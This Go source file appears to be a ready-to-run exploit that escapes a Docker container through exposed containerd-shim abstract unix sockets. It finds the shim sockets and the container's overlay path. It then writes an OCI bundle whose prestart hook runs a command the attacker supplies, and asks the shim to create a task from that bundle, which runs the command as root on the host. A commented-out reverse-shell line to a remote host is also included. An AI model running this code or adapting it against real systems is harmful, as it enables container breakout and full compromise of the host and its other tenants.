package main

import (
	"context"
	"errors"
	"fmt"
	"github.com/containerd/ttrpc"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"regexp"
	"strings"
	shim "github.com/containerd/containerd/runtime/v1/shim/v1"
	"time"
)

var configJson = `
{
  "ociVersion": "1.0.1-dev",
  "process": {
    "terminal": false,
    "user": {
      "uid": 0,
      "gid": 0
    },
    "args": [
      "/bin/bash"
    ],
    "env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "HOSTNAME=b6cee9b57f3b",
      "TERM=xterm"
    ],
    "cwd": "/"
  },
  "root": {
   "path": "/tmp"
  },
  "hostname": "b6cee9b57f3b",
  "hooks": {
        "prestart": [
            {
                "path": "/bin/bash",
                "args": ["bash", "-c", "$SHELLCMD$"],
                "env":  ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"]
            }
        ]
    },
  "linux": {
    "resources": {
      "devices": [
        {
          "allow": false,
          "access": "rwm"
        }
      ],
      "memory": {
        "disableOOMKiller": false
      },
      "cpu": {
        "shares": 0
      },
      "blockIO": {
        "weight": 0
      }
    },
    "namespaces": [
      {
        "type": "mount"
      },
      {
        "type": "network"
      },
      {
        "type": "uts"
      },
      {
        "type": "ipc"
      }
    ]
  }
}
`

func containerdShimApiExp(sock, shellCmd string) error {
	sock = strings.Replace(sock, "@", "", -1)
	conn, err := net.Dial("unix", "\x00"+sock)
	if err != nil {
		return errors.New("fail to connect unix socket")
	}

	client := ttrpc.NewClient(conn)
	shimClient := shim.NewShimClient(client)
	ctx := context.Background()

	// config.json file /run/containerd/io.containerd.runtime.v1.linux/moby/<id>/config.json
	// rootfs path /var/lib/docker/overlay2/<id>/merged

	localBundlePath := fmt.Sprintf("/cdk_%s", RandString(6))
	os.Mkdir(localBundlePath, os.ModePerm)

	dockerAbsPath := GetDockerAbsPath() + "/merged" + localBundlePath

	//var payloadShellCmd = ""
	//if len(shellCmd) > 0 {
	//	payloadShellCmd = shellCmd
	//} else {
	//	payloadShellCmd = fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", rhost, rport)
	//}

	configJson = strings.Replace(configJson, "$SHELLCMD$", shellCmd, -1)

	err = ioutil.WriteFile(localBundlePath+"/config.json", []byte(configJson), 0666)
	if err != nil {
		return errors.New("failed to write file.")
	}

	var M = shim.CreateTaskRequest{
		ID:       RandString(10), // needs to be different in each exploit
		Bundle:   dockerAbsPath,       // use container abspath so runc can find config.json
		Terminal: false,
		Stdin:    "/dev/null",
		Stdout:   "/dev/null",
		Stderr:   "/dev/null",
	}

	info, err := shimClient.Create(ctx, &M)
	if err != nil {
		return errors.New("rpc error response.")
	}
	log.Println("shim pid:", info.Pid)
	return nil
}

func getShimSockets() ([][]byte, error) {
	re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
	if err != nil {
		return nil, err
	}
	data, err := ioutil.ReadFile("/proc/net/unix")
	matches := re.FindAll(data, -1)
	if matches == nil {
		return nil, errors.New("Cannot find vulnerable containerd-shim socket.")
	}

	return matches, nil
}

func ContainerdPwn(shellCmd string) error {
	matchset := make(map[string]bool)
	socks, err := getShimSockets()
	if err != nil {
		return err
	}
	for _, b := range socks {
		sockname := string(b)
		if _, ok := matchset[sockname]; ok {
			continue
		}
		log.Println("try socket:", sockname)
		matchset[sockname] = true
		err = containerdShimApiExp(sockname, shellCmd)
		if err == nil { // exploit success
			return nil
		} else {
			if strings.Contains(fmt.Sprintln(err),"close exec fds: open /proc/self/fd"){
				log.Println("exploit success.")
				return nil
			}
			log.Println(err)
		}
	}
	return errors.New("exploit failed.")
}

func main(){
	var shellCmd  = os.Args[1]
	log.Println("命令执行:",shellCmd)
	err := ContainerdPwn(shellCmd)
	if err != nil {
		log.Println(err)
		return
	}
}

func GetDockerAbsPath() string {
	data, err := ioutil.ReadFile("/proc/self/mounts")
	if err != nil {
		log.Println(err)
	}
	//fmt.Println(string(data))

	// workdir=/var/lib/docker/overlay2/9383b939bf4ed66b3f01990664d533f97f1cf9c544cb3f3d2830fe97136eb76f/work
	pattern := regexp.MustCompile("workdir=([\\w\\d/]+)/work")
	params := pattern.FindStringSubmatch(string(data))
	if len(params) < 2 {
		log.Fatal("failed to find docker abs path in /proc/self/mounts")
	}
	return params[1]
}

func RandString(n int) string {
	rand.Seed(time.Now().UnixNano())
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyz")
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}